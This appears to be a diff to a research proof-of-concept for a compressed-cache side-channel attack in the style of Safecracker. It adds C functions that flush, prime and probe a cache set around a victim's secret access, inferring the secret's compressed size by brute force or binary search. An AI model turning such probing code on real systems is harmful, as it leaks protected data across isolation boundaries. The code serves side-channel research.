@@ -227,6 +227,53 @@ int get_size(int set, void(*accessSecret)(), void(*flush)()){
   return sizes[lo];
 }
 
+int fpc_bruteforce_get_size(int set, void(*accessSecret)(), void(*flush)()){
+  int i = 1;
+  while (i <= 64) {
+    //int mid = (lo + hi) / 2;
+    int testSize = LINESIZE - i;
+    printf("[FPC_GET_SIZE] testSize = %d,  ", testSize);
+    flush(); // Probes full 64b uncompressed lines therefore evicting anything the cache may have held before.
+    PrimeSetWithSize(set, testSize); // Now fills the lines with the 'testsize' amount of bytes, leaving set-testSize bytes empty.
+    accessSecret(); // The secret is brought to the cache and we see wether it's compressed size fits to the set-testSize bytes that are left empty.
+    int misses = ProbeSet(set);
+    printf("[FPC_GET_SIZE] misses = %d\n", misses);
+    if (misses == 0) {
+      //hi = mid;
+      return testSize; // ! Maybe testSize is the max size? Must find the corner case where testSize fits but testSize + 1 doesnt. 
+    }
+    i++;
+  }
+  return LINESIZE; // Nothing was found
+}
+
+int fpc_get_size(int set, void(*accessSecret)(), void(*flush)()){
+  // Do a binary search until find compressed size
+  //int sizes[8] = {8, 16, 20, 24, 34, 36, 40, 64}; // possible sizes in BDI
+  printf("In fpc_get_size.\n");
+  int sizes[16] = {4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60, 64}; // Perhaps because the FPC granularity is 4bytes those are the possible sizes. Depends on the 'VSC segment' size. On the Safecracker examples this is 8bytes.
+  // The fact that the misses here are regularly 16 is a strong pointer towards the 4byte segments (4*16=64)
+  int lo = 0;
+  int hi = 15;
+  while (lo != hi) {
+    int mid = (lo + hi) / 2;
+    int testSize = LINESIZE - sizes[mid];
+    flush(); // Probes full 64b uncompressed lines therefore evicting anything the cache may have held before.
+    PrimeSetWithSize(set, testSize); // Now fills the lines with the 'testsize' amount of bytes, leaving set-testSize bytes empty.
+    accessSecret(); // The secret is brought to the cache and we see wether it's compressed size fits to the set-testSize bytes that are left empty.
+    int misses = ProbeSet(set);
+    printf("[FPC_GET_SIZE] misses = %d\n", misses);
+    if (misses == 0) {
+      hi = mid;
+    } else {
+      lo = mid + 1;
+    }
+  }
+  // Resulting compressed size is sizes[lo]
+  return sizes[lo];
+}
+
+
 // Alternative version which don't use the binary search, reducing the victim stress (only works in the case of the compressed cache is LRU)
 int get_size_LRU(int set, void(*accessSecret)(), void(*flush)()){
   // Test the possible sizes in chunks of 8 by Pack+probe, if there is more than 1 possibility, do another Pack+probe
